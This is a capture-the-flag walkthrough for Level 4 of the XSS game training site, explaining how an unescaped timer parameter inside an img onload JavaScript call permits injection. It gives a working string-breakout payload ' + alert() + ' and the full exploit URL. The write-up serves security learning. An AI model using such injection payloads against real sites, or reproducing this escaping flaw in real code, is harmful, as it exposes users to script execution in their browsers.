
# Level 4: Context matters

## Challenge Overview
- Level 4 focuses on **context-aware XSS** and **proper escaping**.
- The application is a timer/stopwatch that allows users to set a custom timer value.
- Users can input a number and click a button to start the timer.
- **Objective**: Inject JavaScript that triggers an **alert()** by exploiting improper context handling.
- **URL Structure**: `https://xss-game.appspot.com/level4/frame?timer=[VALUE]`

## The Vulnerability
Let's examine the code. You'll likely find something like:
```html
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');">
```
Or in JavaScript:
```js
<script>
	function startTimer(seconds) {
		// ...
	}
</script>
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```
The application takes the `timer` parameter from the URL and inserts it **directly into a JavaScript function call** within an **HTML attribute!**

## Understanding the Attack Vector
The Injection Point:
```html
<img src="/static/loading.gif" onload="startTimer('USER_INPUT');" />
```
Our input is trapped between single quotes inside JavaScript code. To execute our own code, we must break out of the string context and inject executable JavaScript.

## Solution
The Payload:
```
' + alert() + '
```
Full URL:
```
https://xss-game.appspot.com/level4/frame?timer=' + alert() + '
```
How It Works:
```js
startTimer('' + alert() + '');
           |    |         |
           |    |         +- Empty string
           |    +----------- Our alert() executes and returns undefined
           +---------------- Empty string
```
